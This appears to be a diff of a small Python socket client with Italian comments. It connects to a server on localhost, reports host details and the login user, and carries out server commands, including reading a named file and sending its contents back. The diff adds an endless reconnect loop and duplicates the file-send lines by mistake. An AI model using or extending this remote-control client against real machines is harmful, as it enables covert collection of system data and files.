@@ -4,11 +4,18 @@ import os
 
 import psutil
 import subprocess
+import time
 
 serverName = 'localhost'              #corrisponde a 127.0.0.1
 serverPort = 12000                    #usata solo per pairing iniziale, il S.O. assegna poi una porta
 clientSocket = socket(AF_INET, SOCK_STREAM)
-clientSocket.connect((serverName, serverPort))
+while True:
+        try:
+            clientSocket.connect((serverName, serverPort))
+        except:
+            print('Ops... connessione non trovata, attendere...\n')
+            continue
+        break
 info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine() + '\n User:	' + os.getlogin() + \
        '\n Memory:	' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB\n Disk Usage:	' \
        + str(psutil.disk_usage('/').percent) + '%\n Disk File System:	' + str(psutil.disk_partitions())
@@ -37,6 +44,8 @@ while command != 'exit':
         print(command)
         file = open(command[1:], "r")	
         data = file.read()
+        clientSocket.send(data.encode())
+        file.close()
         clientSocket.send(data.encode())
         file.close()
     if command != 'ls' and not command.startswith('0') and not command.startswith('1'):
